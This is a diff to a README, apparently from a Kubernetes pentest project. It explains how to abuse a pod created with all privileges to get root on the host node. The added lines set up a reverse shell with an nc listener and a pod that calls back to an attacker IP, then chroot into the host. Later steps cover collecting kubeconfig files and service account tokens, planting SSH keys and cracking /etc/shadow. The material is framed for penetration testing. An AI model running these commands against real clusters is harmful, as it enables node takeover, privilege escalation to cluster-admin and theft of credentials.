@@ -1,6 +1,8 @@
 # You can create a pod with all the things
 If there are no pod admission controllers applied,or a really lax policy, you can create a pod that has complete access to the host node. You essentially have a root shell on the host, which provides a path to cluster-admin. 
 
+
+## Pod you can exec into
 [pod-everything-allowed.yaml](pod-everything-allowed.yaml)
 
 ### Create a pod
@@ -13,14 +15,36 @@ kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/e
 ### Exec into pod 
 ```bash
 kubectl exec -it pod-everything-allowed -- chroot /host
+```
 
+## Reverse shell pod
+[pod-everything-allowed-revshell.yaml](pod-everything-allowed-revshell.yaml)
+
+### Set up listener
+```bash
+nc -nvlp 3111
+```
+
+### Create a pod
+```bash
+# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
+HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
+```
+
+### Catch the shell and chroot to /host 
+```bash
+~ nc -nvlp 3116
+Listening on 0.0.0.0 3116
+Connection received on 10.0.0.162 42035
+~ chroot /host
 ```
 
 ### Post exploitation
 
 You now have root access to the node. Here are some next steps: 
 
-Look for kubeconfig's in the host filesystem (if you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)
+#### Look for kubeconfig's in the host filesystem 
+If you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)
 
 ```bash
 find / -name kubeconfig
@@ -36,7 +60,8 @@ find / -name kubeconfig
 /mnt/stateful_partition/var/lib/kube-proxy/kubeconfig
 ```
 
-Grab all tokens from all pods on the system and use something like access-matrix to see if any of them give you more permission than you currently have, mainly permissions to read all secrets in kube-system
+#### Grab all tokens from all pods on the system
+Use something like access-matrix to see if any of them give you more permission than you currently have. Look for tokens that have permissions to get secrets in kube-system
 
 ```bash
 # This lists the location of every service account used by every pod on the node you are on, and tells you the namespace. 
@@ -71,6 +96,10 @@ Some other ideas:
 * Add your public key to node and ssh to it
 * Crack passwords in /etc/shadow, see if you can use them to access other nodes
 * Look at the volumes that each of the pods have mounted. You might find some pretty sensitive stuff in there. 
+
+## Demonstrate Impact
+
+If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the pentration test. 
 
    
 ## Reference(s)/Acknowledgements: 
